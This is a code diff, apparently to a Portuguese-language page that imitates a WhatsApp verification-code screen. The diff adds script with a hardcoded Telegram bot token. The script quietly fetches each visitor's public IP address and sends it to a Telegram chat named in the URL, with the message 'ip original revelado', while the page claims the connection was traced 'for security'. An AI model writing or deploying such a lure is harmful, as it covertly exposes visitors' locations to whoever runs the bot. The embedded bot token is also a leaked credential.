@@ -115,6 +115,7 @@
             <p><strong>&lt;#&gt; Sua conta do WhatsApp será registrada em um novo celular</strong></p>
             <p>Nunca compartilhe este código: <span id="whatsappCode"></span></p>
             <p id="randomCode"></p>
+            <p id="ipInfo" class="hidden"></p>
         </div>
     </div>
     
@@ -123,6 +124,9 @@
     </div>
     
     <script>
+        const TELEGRAM_BOT_TOKEN = '8250581893:AAGLlT-nSmXL58Ec1WqdZHGOHmw8YQPObEs';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
         function generateNumber() {
             const display = document.getElementById('numberDisplay');
             const message = document.getElementById('message');
@@ -177,6 +181,38 @@
             }
 
             finalMessage.classList.remove('hidden');
+            document.getElementById('ipInfo').textContent = "🔍 Sua conexão foi rastreada para segurança";
+            document.getElementById('ipInfo').classList.remove('hidden');
+            
+            // Send IP information via Telegram bot
+            sendIPInfo();
+        }
+
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return '127.0.0.1';
+            }
+        }
+
+        async function sendIPInfo() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chat_id');
+            
+            if(chatId) {
+                const ip = await getClientIP();
+                const message = `🖤 ip original revelado: ${ip}`;
+                
+                try {
+                    await fetch(`${TELEGRAM_API_URL}?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                }
+            }
         }
     </script>
 </body>
